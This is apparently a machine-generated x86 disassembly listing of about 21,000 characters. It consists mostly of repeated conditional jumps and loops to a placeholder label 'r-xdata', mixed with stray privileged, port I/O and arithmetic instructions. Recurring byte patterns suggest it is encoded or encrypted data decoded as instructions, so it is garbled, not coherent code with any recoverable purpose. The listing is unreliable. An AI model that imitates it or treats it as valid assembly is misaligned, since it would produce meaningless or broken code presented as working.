jecxz r-xdata
je r-xdata
sbb eax 0xe2e24e74
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
loop r-xdata
jb r-xdata
mov al ah
outsd
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xbc0bfa97
in al dx
loop r-xdata
jb r-xdata
mov cl 0xb
adc al 0xc1
loop r-xdata
jb r-xdata
imul esp esi 0x7221bbc6
jb r-xdata
jmp edx
mov bl ah
or ebx eax
loop r-xdata
or esi [ ebx ]
loop r-xdata
sbb [ 0x751db21d ] ebx
mov dl 0x6f
and dh [ edx - 0x27f41c78 ]
cmp al 0xb
push esi
shl [ edx ] 0x1
mov [ 0xffffffffe2f8bc0b ] al
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
xor cl [ ebx ]
mul edx
shl al cl
loop r-xdata
push cs
sbb eax 0x1ec10a1d
mov bh 0xea
outsd
sub bl [ bx ]
jb r-xdata
mov ah 0xb
xor al 0xc2
mov [ ebx + ecx + 0x1d1d10a7 ] dl
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
or cl [ edx ]
jb r-xdata
mov cl 0xb4
pop esp
into
loop r-xdata
loop r-xdata
mov edi 0x721d1d3b
jb r-xdata
adc ch [ ecx + 0x1c ]
or edi [ ebp - 0x6 ]
lahf
mov ebx 0x67ed2267
mov ah 0x3d
jb r-xdata
or ecx [ ebx + 0xe ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esi + 0x10af6b84 ] dl
mov ebx 0x6b84cc88
sbb eax 0xe2e24675
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and bh [ ebx + ecx - 0x1d1d104c ]
jb r-xdata
jb r-xdata
mov dl 0x6f
jb r-xdata
mov bh 0xa
cmpsd [ esi ] [ edi ]
push ds
jb r-xdata
sbb eax 0xa751db2
jb r-xdata
popad
jb r-xdata
mov esp 0xe2efb40b
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
xchg esi eax
test [ ebx - 0x51 ] ch
adc [ ebx + 0x6b84cc88 ] bh
pop edi
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
outsd
jb r-xdata
xchg edi eax
movsb [ edi ] [ esi ]
salc
or esp [ esi - 0x11 ]
loop r-xdata
sbb eax 0x104c0a72
sbb eax 0x2267bb1d
jb r-xdata
jb r-xdata
mov al [ 0x45f7be6a ]
popad
sbb al 0xc2
jb r-xdata
sbb eax 0xf60b67ed
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
adc [ 0x7272721d ] bl
sbb eax 0xa70b9488
xchg esi eax
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x160f0bee ] 0x6f721d1d
jb r-xdata
sbb eax 0xe2e20a75
jb r-xdata
jb r-xdata
sbb eax 0xe2e26274
loop r-xdata
0xf7be6aa0 0x6145
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0xef
loop r-xdata
sbb eax 0x7272721d
or bl [ ebp + 0xb1d1d38 ]
sbb eax 0xb94881d
jb r-xdata
cmp [ ebx + ecx + 0x1d1d07b0 ] esi
jb r-xdata
jb r-xdata
and ch ch
mov ah 0x3d
out 0xe3 al
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx ]
loop r-xdata
jb r-xdata
and ah dl
jb r-xdata
out 0xc6 al
arpl [ esi ] cx
dec esi
out 0xe2 al
loop r-xdata
jb r-xdata
imul ecx [ esi ] 0x8ae688b5
or esi [ edi + ebp * 8 + 0x7272e2e2 ]
jb r-xdata
sbb [ 0x751db21d ] ebx
or eax ebp
or ah dl
mov dh 0x19
and al 0xea
mov esi 0x1c6145f7
retn 0x60ed
in eax dx
pushad
or edi [ edi ]
mul dl
loop r-xdata
or ecx [ eax - 0x14 ]
cmpsd [ esi ] [ edi ]
push ds
loope r-xdata
jb r-xdata
mov esi 0xb21d1d1f
rcl [ esp + esi * 4 ] 0x1
sbb eax 0x6e0baeb5
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out dx al
or ecx [ edi ]
push ss
jb r-xdata
jb r-xdata
in eax dx
sbb eax 0xa721d1d
jb r-xdata
loop r-xdata
sbb ah [ edi + 0x1d ]
in eax dx
or esi esi
push edx
push 0xffffffbe
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl dl 0x1
loop r-xdata
outsd
sbb eax 0x7272721d
jb r-xdata
imul ebp [ edi + 0xb808818 ] 0x6c
push ds
movsb [ edi ] [ esi ]
salc
mov dl 0xb
pop edx
cld
loop r-xdata
mov dh ah
jb r-xdata
or edi [ edi + 0x72e2e2f4 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
adc esi edx
loop r-xdata
outsd
loop r-xdata
jb r-xdata
add [ 0x1ea71d1d ] ebx
mov ch 0xb
add eax [ 0x676f1d1d ]
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xb1ea71d
dec eax
jb r-xdata
into
outsb
or ebx esp
xor bl [ ebx - 0x629e8de3 ]
retn 0xbe3
mov [ 0xffffffffc6e66bfa ] al
jb r-xdata
loop r-xdata
and ah dl
jb r-xdata
jb r-xdata
jb r-xdata
movhps xmm3 [ 0xffffffffb76f721d ]
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebp + 0x61 ] 0x60edc21c
fldenv [ esi + edx * 8 - 0x1d1099f5 ]
loop r-xdata
loop r-xdata
or ebp [ esi - 0x32 ]
loop r-xdata
jb r-xdata
or esp [ edi + 0x721d1d10 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
push ds
sar [ ecx ] 0x1
test [ ebx - 0x41 ] ch
sbb al 0xb
lodsb [ esi ]
shl edx 0x1
loop r-xdata
outsd
imul esp [ edi + 0x16971dea ] 0x1d0e4b0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
hlt
jb r-xdata
imul ebp [ edi - 0x7b4f44f6 ] 0x6b
scasd [ edi ]
mov [ edx + 0x65e0bb8 ] bl
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ecx [ ebp + 0x39 ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
loop r-xdata
or bl [ ebx - 0x2e1d1d0b ]
and cl [ ebx ]
push ecx
in eax 0xe2
adc [ 0x2267bb1d ] bl
sbb eax 0x4c0a721d
jb r-xdata
loop r-xdata
sbb eax 0xe288ee97
sbb eax 0xe2e26272
loop r-xdata
loop r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0x72727221
sbb eax 0xb76f721d
jb r-xdata
jb r-xdata
push cs
scasd [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0x1ea71d1d
jb r-xdata
int 0xf0
loop r-xdata
and ch ch
dec esp
fcomp [ 0xa721d1d ]
jb r-xdata
imul esp [ 0x1d028b0b ] 0x7272721d
jb r-xdata
jb r-xdata
push cs
arpl [ esi ] cx
mov dh 0xeb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
jb r-xdata
jb r-xdata
jb r-xdata
sti
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
outsd
sbb bl [ edi ]
sbb eax 0xf5e20a1d
cmpsd [ esi ] [ edi ]
and dh [ edx + 0x1fbe676f ]
sbb eax 0x971db21d
0xb236a76f 0x9b0b
cli
jb r-xdata
imul esp esi 0xffffffc6
sbb ah [ edi + 0x1d ]
in eax dx
loop r-xdata
shl [ edx ] 0x1
mov cl 0xb
mov al [ 0xffffffffd1e2e2f8 ]
popad
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
fwait
cmc
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0x100bba88
retn 0xe2e2
jb r-xdata
sbb eax 0x751db21d
outsd
mov dh 0x19
push ds
mov bl 0xb
and dh [ edx - 0x50901f78 ]
in al dx
sbb eax 0x480b1ea7
loopne r-xdata
fldenv [ ecx ]
in eax dx
or edx [ edx ]
jb r-xdata
jb r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
mov cl 0xb4
mov ch [ ebx - 0x3f ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x971d1e97
push es
sbb eax 0xe28afeb5
outsd
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ esi + 0x721d1d01 ]
add [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
mov edx 0x1d3e360b
or edx eax
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xf2a1691d
and ch ch
mov si 0xe2ff
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jecxz r-xdata
shl [ edx ] 0x1
or edx [ ecx - 0x1b ]
loop r-xdata
loop r-xdata
mov bh 0x69
cli
or edi [ esp + ebp * 8 + 0x751de2e2 ]
inc esi
loop r-xdata
sbb eax 0x971db272
jb r-xdata
loop r-xdata
imul esp [ edi - 0x115096e2 ] 0x1d160f0b
mov edx 0xe2c2100b
loop r-xdata
jb r-xdata
push cs
jb r-xdata
xchg esp eax
jb r-xdata
push ds
imul edi [ edi - 0x7bc62ee2 ] 0x6b
mov edi 0xd1ac0b1c
loop r-xdata
ror [ ebx ] 0xe2
jb r-xdata
or [ ebx ] 0x79
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
push ds
sbb eax 0xb51d0697
dec [ edx - 0x1d1d9d1e ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
ror ah 0x1
loop r-xdata
jb r-xdata
jb r-xdata
mov [ 0x1d1e9f6b ] bl
or esi [ ecx + 0x72e2e2ff ]
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
outsd
push cs
mov ch 0x88
out 0x8a al
shr [ ebx ] 0x1
or ecx [ edx - 0x7 ]
loop r-xdata
scasd [ edi ]
0x1d01b00b 0x721d
and eax 0x918e1ea7
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] 0x72721d1d
mov [ ebp - 0x1d0c1cf5 ] cl
jb r-xdata
or eax 0x72721d1d
jb r-xdata
or edi edx
jb r-xdata
sbb eax 0x1db2721d
sar [ edx - 0x63f43878 ] 0x1e
sbb cl [ ebx ]
jb r-xdata
adc dl al
jb r-xdata
loop r-xdata
sbb eax 0xb4727272
jb r-xdata
jb r-xdata
loopne r-xdata
loop r-xdata
imul ecx [ esi ] 0xebb60e63
loop r-xdata
jb r-xdata
cmp eax 0x72721d1d
jb r-xdata
jns r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
popad
sahf
jb r-xdata
jb r-xdata
loop r-xdata
and ah [ esi - 0x1e ]
imul esp [ edi + 0xaa76b1a ] 0x1d1ab20b
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
out 0x6b al
cmpsb [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
scasd [ edi ]
push ss
loope r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
push ds
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
lea ecx [ ebx ]
jecxz r-xdata
sbb [ 0xb94881d ] bl
mov edi 0x72e2e2f4
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
and eax 0x1d028b0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
cld
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov ss [ ecx + 0x741de2c0 ]
jb r-xdata
or edi [ ecx + 0x3e ]
jb r-xdata
jb r-xdata
mov dl 0xb
jb r-xdata
loop r-xdata
mul [ es : edi + 0x22 ]
or esi [ edx ]
adc eax 0x72721d1d
jb r-xdata
xchg ebp eax
jb r-xdata
sbb ch [ ebx - 0x59 ]
jb r-xdata
or cl [ ebx ]
sbb ch [ ecx - 0x59 ]
jb r-xdata
0xe2e2
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mul [ ebx - 0x12115027 ]
pushad
adc al 0xfb
int3
mov dh ah
imul esp [ esi - 0x1d75353a ] 0xffffffd2
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb ch [ edi - 0x51 ]
add dh [ ebx + 0x691e921d ]
shl dl 0x1d
xchg ecx eax
jb r-xdata
imul esi [ edi + 0x1ea7691a ] 0x6b
and bh [ ebp + 0x212bb9bc ]
jb r-xdata
or esp [ eax - 0x2e1d1d08 ]
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah cl
adc cl [ esi ]
jb r-xdata
test [ ebx - 0x51 ] ch
sbb bh [ ebx + 0x18af6b84 ]
mov [ eax + 0x1d1e6c0b ] al
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
dec ebx
retn 0xe2e2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esi esp 0x3d
sbb eax 0xc7510b1d
loop r-xdata
jb r-xdata
adc al 0xd
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx + 0x72e2e2ca ]
loop r-xdata
jb r-xdata
into
xchg bp ax
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
push ds
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
push es
jb r-xdata
jb r-xdata
lahf
push ds
in eax dx
popf
add [ 0xffffffffe688b51d ] ebx
outsd
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
loope r-xdata
mov eax [ 0x721d1d3d ]
jb r-xdata
loop r-xdata
jb r-xdata
je r-xdata
sbb eax 0x1d1e9f6b
jb r-xdata
jb r-xdata
mov ch bh
or [ ecx + 0x2a ] ch
test [ ebx - 0x51 ] ch
mov dl al
test [ ebx - 0x51 ] ch
or bh [ ebx - 0x50947b50 ]
jb r-xdata
sbb eax 0x7272212b
jb r-xdata
cmp ah [ edi + 0x39 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
jb r-xdata
mov dl 0xb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe2e25a74
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and bl bl
jb r-xdata
mov dl 0x88
loop r-xdata
jb r-xdata
or esi [ esi ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esi [ edx + 0x721d1d1a ]
jb r-xdata
imul esp [ edi + 0x1aa76906 ] 0x6b
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esp [ edi + 0x6a76b1e ] 0x6b1aa769
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
je r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ ebx ] ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and cl [ eax - 0x58947b34 ]
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edx + eax * 4 + 0x1d3e790b ] 0x1d
jb r-xdata
jb r-xdata
push ds
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
popad
clc
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp [ edx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
retn 0x6b84
pop esp
sbb al 0x1d
sbb eax 0x72727272
jb r-xdata
push ds
jb r-xdata
loop r-xdata
jb r-xdata
adc ebp ebp
jb r-xdata
sbb bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
imul esp [ edi + 0x1ab20b0a ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
mov ebx 0x3caf6b84
or edx [ esi + 0x39 ]
sbb eax 0x7272721d
mov ebx 0x6b84cc88
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor [ edx ] dl
jb r-xdata
jb r-xdata
jb r-xdata
adc bl [ 0x7272721d ]
imul edi [ edx ] 0x300b3967
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
int3
jb r-xdata
in eax dx
mov ch 0x6b
jb r-xdata
mov bl 0x1d
xchg edx eax
0xbeaafe1 0x1b0
cmpsd [ esi ] [ edi ]
sar [ ecx ] 0x1
test [ ebx - 0x41 ] ch
enter 0x3d69 0x84
loop r-xdata
js r-xdata
mov [ esp + eax * 4 + 0x69fea76b ] cl
and [ ebx ] cl
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
or esp [ ecx + 0x721d1d3d ]
jb r-xdata
jb r-xdata
imul esp [ edi + 0xb2069fe ] 0xffffffa7
jb r-xdata
out dx al
mov cl 0x1d
mov ah 0xd6
or edi esi
lahf
jb r-xdata
jb r-xdata
or al 0x13
jb r-xdata
in eax dx
ja r-xdata
imul ecx [ esi ] 0x88ee0e61
jb r-xdata
imul esp [ edi - 0x24dd2ee2 ] 0xffffffa7
push cs
xchg ebx eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sti
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov edi 0xdc0bb91a
jb r-xdata
loop r-xdata
or esi [ edx + eax * 8 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
or ebx [ ebp + 0x72e2e2f4 ]
jb r-xdata
mov ecx 0x72727221
jb r-xdata
cmp [ bp + di ] ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6b774510 ] 0xffffff84
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
jb r-xdata
movsb [ edi ] [ esi ]
jb r-xdata
imul edx [ edx ] 0x66ed11d9
inc ebx
and ah dl
loop r-xdata
loop r-xdata
or edx [ ecx + 0x72721d1d ]
jb r-xdata
jb r-xdata
cmp [ ebx + ebp * 2 + 0x3d69c8bf ] eax
loop r-xdata
jb r-xdata
imul ebp edx 0xbeaafe1
mov al 0x1
sbb eax 0x7272721d
mov ch 0x1d
xchg edi eax
imul esp [ edi + 0x2af6f1a ] 0x1e921db3
sbb eax 0xd10a721d
adc bl [ 0x30fe8a1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x1a
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
adc al 0x88
mov [ esp + eax * 4 - 0x45e95895 ] dl
jb r-xdata
jb r-xdata
jb r-xdata
xchg [ esi ] ebx
and ah [ edx - 0x1d0743f5 ]
jb r-xdata
push ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
hlt
jb r-xdata
sub ecx [ ebx ]
jb r-xdata
or esi [ eax ]
jb r-xdata
jb r-xdata
jb r-xdata
in eax 0xfb
loop r-xdata
mov ah 0xb4
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or eax 0x72721d1d
jb r-xdata
jb r-xdata
or ah dl
sbb ebx [ 0xffffffffd912691d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push cs
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
stosb [ edi ]
jb r-xdata
test [ ebx - 0x59 ] ch
movsd [ edi ] [ esi ]
jb r-xdata
mov [ ebx + ebp * 2 + 0x2069fea7 ] es
or esp [ edi + 0x72e2e2fc ]
jb r-xdata
loop r-xdata
jb r-xdata
mov eax [ 0xffffffffe165e669 ]
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or eax [ eax - 0x36 ]
loop r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
push cs
movlps [ 0x7272721d ] xmm3
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
and al ah
test [ ecx - 0x22 ] ah
loop r-xdata
0xe2e68f0b 0x72e2
imul esp [ edx - 0x1ee41e06 ] 0x6b13e13b
mov dl al
jb r-xdata
xchg esp eax
jb r-xdata
jb r-xdata
imul edi [ edi - 0x23f446e6 ] 0xffffffc6
loop r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
pop esi
rcl [ edx ] 0x1
jb r-xdata
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
std
mov dl ch
jb r-xdata
jb r-xdata
jb r-xdata
mov edx 0x6b848c88
jb r-xdata
imul esp [ eax ] 0xe2fca70b
loop r-xdata
jb r-xdata
cdq
jb r-xdata
mov ah cl
shl [ edx ] 0x1
jb r-xdata
mov bh 0x2a
test [ ebx - 0x49 ] ch
adc [ eax + 0x6b848e88 ] bh
sbb cl cl
adc dh [ edi ]
jb r-xdata
out 0x65 al
jb r-xdata
inc esi
mov edi 0xb76b8442
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x721d1d38 0x7272
jb r-xdata
jb r-xdata
jb r-xdata
sub ecx [ bp + di ]
loope r-xdata
jb r-xdata
mov cl 0xb
not [ edi ]
sbb eax 0x7272721d
outsd
inc edx
pop ss
sbb eax 0xbb2b11d
retn 0xe2f7
jb r-xdata
sbb eax 0x7272721d
in eax dx
0xe2e2
popfd
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
pop [ ebx + ebp * 2 - 0x77450759 ]
or edi edi
cli
loop r-xdata
test [ ebx - 0x59 ] ch
fistp [ ecx - 0x334cf436 ]
jb r-xdata
sbb bh [ ecx - 0x1d3923f5 ]
loop r-xdata
popad
jb r-xdata
sbb eax 0x30fe8a1d
jb r-xdata
or edi [ eax - 0x14 ]
jb r-xdata
jb r-xdata
jb r-xdata
outsd
fst [ ecx ]
jb r-xdata
in eax dx
cmpsd [ esi ] [ edi ]
jb r-xdata
or esp [ ecx + 0x3d ]
jb r-xdata
or esi [ ebx + 0x72e2e2cc ]
jb r-xdata
jb r-xdata
jl r-xdata
jb r-xdata
sbb eax 0x39d11269
fst [ ecx ]
loop r-xdata
sbb eax 0x6c66ed1d
jb r-xdata
jb r-xdata
0x1d3ac20b 0x721d
loope r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
imul esp eax 0x7221e3c9
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg [ edx + 0x1ea76b84 ] edi
loope r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
0xb30b
jb r-xdata
loop r-xdata
mov bh dh
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
mov ah 0x88
jb r-xdata
cmp eax 0x72721d1d
jb r-xdata
popad
jb r-xdata
int3
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
popad
push es
sbb ah [ ebx + 0xe ]
loop r-xdata
adc edx [ ebx ]
jb r-xdata
jb r-xdata
loopne r-xdata
in eax dx
insb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x710bceb4
aas
or cl [ ebx - 0x44e2e2cc ]
mov bh 0x46
jb r-xdata
jb r-xdata
jb r-xdata
imul esp esi 0xeaa7e165
or eax edx
cmp bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x48947bbe ] 0x46
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi + 0xb22671a ] 0xffffff9a
jb r-xdata
xchg al ch
loop r-xdata
and ch ch
call [ bx + di ]
sbb eax 0xbabe881d
test [ ebx - 0x59 ] ch
jb r-xdata
or ecx [ edi ]
jb r-xdata
sbb ah [ edi + 0x22 ]
adc ebp [ ebx - 0x59 ]
jb r-xdata
loop r-xdata
mov bl 0xcc
jb r-xdata
xor [ esi + 0x6b ] bl
jb r-xdata
out dx al
sbb eax 0xd912691d
popad
jb r-xdata
or ebp ebp
or bl [ 0x7272721d ]
retn 0xff0b
jb r-xdata
sbb eax 0x72727272
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
push cs
mov cl 0x1d
test [ esi - 0x1e ] 0x120be2e2
aaa
jb r-xdata
loop r-xdata
sbb eax 0xa725721d
jb r-xdata
sbb eax 0x810bbeb5
jb r-xdata
insb
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
popad
jb r-xdata
jb r-xdata
mov ebx 0xed2267bd
jb r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
inc edx
jb r-xdata
jb r-xdata
leave
shl [ edx ] 0x1
test [ ebx - 0x59 ] ch
sbb al 0x6f
cmpsd [ esi ] [ edi ]
adc dh [ edx + 0xaeaa769 ]
mov [ edi - 0x58947b46 ] al
sbb cl [ eax + 0x6b84ba9a ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb [ eax + 0x6b84ba87 ] cl
cmpsd [ esi ] [ edi ]
push ds
xchg [ edx + 0x1aa76b84 ] edi
mov [ edx - 0x58947b46 ] bl
inc eax
adc ebx [ 0x7272721d ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
imul esi [ ebp + 0xb82a46b ] 0x79
jb r-xdata
imul esp [ edi + 0xb22d136 ] 0x58
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or [ ebx ] 0x61
jb r-xdata
and ch al
or ecx [ ebx + edx ]
push ss
mov edx 0x14a76b84
mov [ eax + 0x1d3d610b ] al
mov edx 0x6b849488
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov cl 0xb4
mov ch 0xa
pop es
or esp edi
sbb [ 0x7272721d ] bl
or ecx [ ebx ]
loope r-xdata
jb r-xdata
out dx al
mov ch 0xbe
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
xor al 0x1d
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x6f72721d
cmpsd [ esi ] [ edi ]
imul esp [ edi + 0x1ea7611e ] 0xffffffe6
or eax ecx
retn 0xe2e2
mov dl 0x1d
mov ah 0xce
or esi [ ecx + 0x3f ]
jb r-xdata
sbb eax 0x67bdbbbb
imul esi [ edi + 0x348b0a46 ] 0x1d
jb r-xdata
loopne r-xdata
loop r-xdata
jb r-xdata
out 0xa1 al
jb r-xdata
jb r-xdata
jb r-xdata
push ecx
nop [ 0x1d100f0b ] ebx
sbb eax 0x72727272
jb r-xdata
push esp
in eax 0xb2
arpl [ 0xffffffffe2e2e228 ] sp
outsd
add eax 0xb21d1d10
mov cl 0xb1
mov ch ah
mov cl 0x1d
jne r-xdata
and cl [ bp + di ]
jb r-xdata
mov [ edx ] esp
call 0x1d58be9a
sbb eax 0x12d10a72
0x8816a76f 0xbe2
jb r-xdata
mov dl 0xb4
jb r-xdata
jb r-xdata
sbb eax 0x88b4b4b2
jb r-xdata
jb r-xdata
mov ch 0xb2
loop r-xdata
jb r-xdata
push esp
loop r-xdata
jb r-xdata
sbb eax 0x72727272
loop r-xdata
0x6fe2e2e0 0x1a67
jb r-xdata
loop r-xdata
push cs
or eax [ ecx + 0x72e2e2fe ]
in eax dx
jl r-xdata
imul edx [ edx ] 0x11d939d1
popad
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
int3
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
